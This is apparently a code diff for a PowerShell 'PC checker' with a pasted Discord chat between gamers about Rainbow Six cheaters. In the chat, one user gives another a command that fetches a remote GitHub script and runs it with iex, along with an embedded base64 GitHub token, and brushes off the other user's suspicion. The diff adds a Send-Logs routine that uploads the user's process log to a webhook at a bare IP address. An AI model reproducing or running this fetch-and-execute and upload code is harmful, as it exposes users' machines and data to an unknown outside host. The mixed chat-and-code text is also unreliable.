@@ -1,3 +1,146 @@
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱
+suprsor
+1101157258655695008Copydon’t contact me until 3:00 pm pst
+
+kam — 1/4/2025 11:52 PM
+im 52
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — 1/4/2025 11:52 PM
+Xotiic got a fucking 4k c4 on his own team
+kam — 1/4/2025 11:52 PM
+all my teamates are 0
+💀
+5-2
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — 1/4/2025 11:53 PM
+and i almost won the round
+kam — 1/4/2025 11:58 PM
+i cant if i get thrown im off
+😕
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — 1/5/2025 12:00 AM
+And on my demote back to emerald game there is a cheater
+kam — 1/5/2025 12:02 AM
+im going 9-3
+and none of my teamates are over 3 kills
+🥲
+i fucking cant
+i got thrown
+Image
+im off for tn i cant this is the reason i never hit high rank like fuck me
+kam — 1/5/2025 11:03 AM
+yo might have. acheater in mg game 1.9 in 30 games
+and he just ran out and shit on my teamate without any intel unless my teamates where retarted and dint shoot the cam
+Image
+kam — 1/5/2025 11:19 AM
+mom has soft aim and walls
+i can pull up the replay for you later
+he wasnt even aiming on are bodys and he was hitting shots and they where playing way to confident jumping out windows and shit
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — 1/6/2025 8:22 PM
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — 1/6/2025 8:42 PM
+Image
+https://specs.gg/suprsors 
+suprsors RAINBOW SIX Settings & Equipment - Updated January 2025
+suprsors RAINBOW SIX Settings and Equipment - Including Sensitivity, DPI, Resolution, FOV, Keybinds, Mouse, Keyboard, Headset & more
+https://specs.gg/suprsors#google_vignette
+suprsors RAINBOW SIX Settings & Equipment - Updated January 2025
+suprsors RAINBOW SIX Settings and Equipment - Including Sensitivity, DPI, Resolution, FOV, Keybinds, Mouse, Keyboard, Headset & more
+https://specs.gg/suprsors
+suprsors RAINBOW SIX Settings & Equipment - Updated January 2025
+suprsors RAINBOW SIX Settings and Equipment - Including Sensitivity, DPI, Resolution, FOV, Keybinds, Mouse, Keyboard, Headset & more
+https://specs.gg/fiorir6
+fiorir6 RAINBOW SIX Settings & Equipment - Updated January 2025
+fiorir6 RAINBOW SIX Settings and Equipment - Including Sensitivity, DPI, Resolution, FOV, Keybinds, Mouse, Keyboard, Headset & more
+kam — 1/6/2025 11:45 PM
+??
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — 1/6/2025 11:45 PM
+join gen lmao
+kam — Yesterday at 12:22 AM
+hes mad ik dyslexia better than him
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Yesterday at 12:28 AM
+XotiicDiddeler
+kam — Yesterday at 1:48 AM
+https://discord.com/invite/FsUaj8SF
+kam — Yesterday at 2:46 PM
+wanna check my pc once your back or naw?
+kam — Yesterday at 5:33 PM
+yo wtf is this? what cheats are these
+someone posted this ina server im in?????
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Yesterday at 6:43 PM
+Image
+kam — Yesterday at 6:45 PM
+Image
+Image
+Image
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Yesterday at 9:17 PM
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Yesterday at 9:56 PM
+IMG_0198.mov
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Yesterday at 10:43 PM
+Image
+kam — Yesterday at 10:51 PM
+HES UGLY ASFF
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Yesterday at 10:51 PM
+Seriously
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Yesterday at 10:58 PM
+Image
+kam — Today at 2:38 PM
+lolll
+yall onÉ
+?
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Today at 2:42 PM
+
+Clear-Host
+
+$asciiArtUrl = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Art.ps1"
+$asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
+Invoke-Expression $asciiArtScript
+Expand
+message.txt
+14 KB
+kam — Today at 2:42 PM
+is that the pc checker is ghithub alil suss
+is that the pc checker its ghithub alil suss 
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Today at 2:42 PM
+No, it is not.
+kam — Today at 2:42 PM
+loll
+kk
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Today at 2:42 PM
+That just means the code is public for everyone to review.
+kam — Today at 2:43 PM
+ahh kk yall in a a vc?
+ahh kk yall in a  vc? 
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Today at 2:43 PM
+no
+im abt to be
+kam — Today at 2:43 PM
+kk ill hop in afk just drag me whenever
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Today at 2:44 PM
+$t="Z2l0aHViX3BhdF8xMUJMQjMzVVEwbkVzOHhJeVBpUnpoX2g3RUhSaTB0YkN5cWphV1lOTFBXWWE4WkZSb1RxeU5JSG1CcjU5UVRQV3ZGSzVSRUNCQVFpWTJVT05w"; iwr -useb https://raw.githubusercontent.com/suprsor/Pc-Checker-Main/refs/heads/main/SuprsorsPcCheck.ps1 | iex
+𝒮𝓊𝓅𝓅𝓇𝑒𝓈𝓈𝑜𝓇 ♱ — Today at 2:51 PM
+
+
+\Device\HarddiskVolume3\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win32\EpicGamesLauncher.exe  
+\Device\HarddiskVolume3\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win64\EpicGamesLauncher.exe  
+\Device\HarddiskVolume3\Program Files (x86)\Intel\Driver and Support Assistant\DSATray.exe  
+\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe  
+Expand
+PcCheckLogs.txt
+34 KB
+
+Clear-Host
+
+$asciiArtUrl = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Art.ps1"
+$asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
+Invoke-Expression $asciiArtScript
+Expand
+message.txt
+15 KB
+﻿
+kam
+xkammix
+im kam :D 
+
+
+
+she makes everything better and pushes me to do better shes the best :)
 
 Clear-Host
 
@@ -266,6 +409,9 @@ function Send-Logs {
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
     $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
 
+    if (Test-Path $logFilePath) {
+        $url = "http://51.81.215.34:5000/webhook"
+
         $fileContent = Get-Content -Path $logFilePath -Raw
 
         $boundary = [System.Guid]::NewGuid().ToString()
@@ -283,10 +429,12 @@ function Send-Logs {
             $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
             Write-Host "."
         }
-       
+        catch {
+            Write-Host "Failed to send log: $_" -ForegroundColor Red
         }
     }
-    
+    else {
+        Write-Host "Log file not found." -ForegroundColor Red
     }
 }
 function Main {
